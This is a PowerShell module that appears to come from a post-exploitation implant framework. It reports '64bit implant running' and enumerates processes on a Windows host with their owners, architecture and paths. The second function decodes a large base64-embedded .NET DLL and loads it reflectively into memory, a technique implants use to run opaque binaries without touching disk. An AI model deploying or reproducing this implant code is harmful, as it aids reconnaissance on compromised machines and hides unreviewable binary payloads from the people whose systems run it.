Function Get-ProcessFull {

[System.Diagnostics.Process[]] $processes64bit = @()
[System.Diagnostics.Process[]] $processes32bit = @()

$owners = @{}
$fp = gwmi win32_process;

ForEach ($r in $fp) {
    try {
        $owners[$r.handle] = $r.getowner().user
    } catch {}
}

$AllProcesses = @()

    if (Test-Win64) {
        Write-Output "64bit implant running on 64bit machine"
    }

if (Test-Win64) {
    foreach($process in get-process) {
    $modules = $process.modules
    foreach($module in $modules) {
        $file = [System.IO.Path]::GetFileName($module.FileName).ToLower()
        if($file -eq "wow64.dll") {
            $processes32bit += $process
            $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, Username
            $pobject.Id = $process.Id
            $pobject.StartTime = $process.StartTime
            $pobject.Name = $process.Name
			$pobject.Path = $process.Path
            $pobject.Arch = "x86"
            $pobject.UserName = $owners[$process.Id.tostring()]
            $AllProcesses += $pobject
            break
        }
    }

    if(!($processes32bit -contains $process)) {
        $processes64bit += $process
        $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, UserName
        $pobject.Id = $process.Id
        $pobject.StartTime = $process.StartTime
        $pobject.Name = $process.Name
		$pobject.Path = $process.Path
        $pobject.Arch = "x64"
        $pobject.UserName = $owners[$process.Id.tostring()]
        $AllProcesses += $pobject
    }
}
}
elseif ((Test-Win32) -and (-Not (Test-Wow64))) {
foreach($process in get-process) {
    $processes32bit += $process
    $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, Username
    $pobject.Id = $process.Id
    $pobject.StartTime = $process.StartTime
    $pobject.Name = $process.Name
	$pobject.Path = $process.Path
    $pobject.Arch = "x86"
    $pobject.UserName = $owners[$process.Id.tostring()]
    $AllProcesses += $pobject
}
}
elseif ((Test-Win32) -and (Test-Wow64)) {
    foreach($process in get-process) {
    $modules = $process.modules
    foreach($module in $modules) {
        $file = [System.IO.Path]::GetFileName($module.FileName).ToLower()
        if($file -eq "wow64.dll") {
            $processes32bit += $process
            $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, Username
            $pobject.Id = $process.Id
            $pobject.StartTime = $process.StartTime
            $pobject.Name = $process.Name
			$pobject.Path = $process.Path
            $pobject.Arch = "x86"
            $pobject.UserName = $owners[$process.Id.tostring()]
            $AllProcesses += $pobject
            break
        }
    }

    if(!($processes32bit -contains $process)) {
        $processes64bit += $process
        $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, UserName
        $pobject.Id = $process.Id
        $pobject.StartTime = $process.starttime
        $pobject.Name = $process.Name
		$pobject.Path = $process.Path
        $pobject.Arch = "x64"
        $pobject.UserName = $owners[$process.Id.tostring()]
        $AllProcesses += $pobject
    }
}
} else {
    Write-Output "Unknown Architecture"
}

$AllProcesses|Select ID, UserName, Arch, Name, Path, StartTime | format-table -auto

}
$psloadedproclist = $null
Function Get-ProcessList() {
if ($psloadedproclist -ne "TRUE") {
    $script:psloadedproclist = "TRUE"
    $ps = "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Y2Vzc0lEAE1BWF9QQVRIAHZhbHVlX18AbXNjb3JsaWIAR2V0UHJvY2Vzc0J5SWQAVGhyZWFkAEFwcGVuZABjbnRVc2FnZQBHZXRFbnZpcm9ubWVudFZhcmlhYmxlAGdldF9IYW5kbGUAUnVudGltZVR5cGVIYW5kbGUAQ2xvc2VIYW5kbGUAR2V0VHlwZUZyb21IYW5kbGUAVG9rZW5IYW5kbGUAUHJvY2Vzc0hhbmRsZQBwcm9jZXNzSGFuZGxlAHN6RXhlRmlsZQBNb2R1bGUAZ2V0X05hbWUAbHBwZQBWYWx1ZVR5cGUAcGNQcmlDbGFzc0Jhc2UAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBnZXRfU2l6ZQBkd1NpemUAU2l6ZU9mAEluZGV4T2YAVG9TdHJpbmcAU3Vic3RyaW5nAGlzMzJiaXRhcmNoAE1hcnNoYWwAU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbABBbGwAYWR2YXBpMzIuZGxsAGtlcm5lbDMyLmRsbABHZXQtUHJvY2Vzc0xpc3QuZGxsAFN5c3RlbQBFbnVtAE9wZW5Qcm9jZXNzVG9rZW4AU3lzdGVtLlJlZmxlY3Rpb24ARXhjZXB0aW9uAFplcm8AU3RyaW5nQnVpbGRlcgBQcm9jSGFuZGxlcgBHZXRQcm9jZXNzVXNlcgAuY3RvcgBJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAGNudFRocmVhZHMAU3lzdGVtLlJ1bnRp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"
    $dllbytes  = [System.Convert]::FromBase64String($ps)
    $assembly = [System.Reflection.Assembly]::Load($dllbytes)
}
try{
    $r = [ProcHandler]::GetProcesses()
    echo $r
} catch {
    echo $error[0]
}
}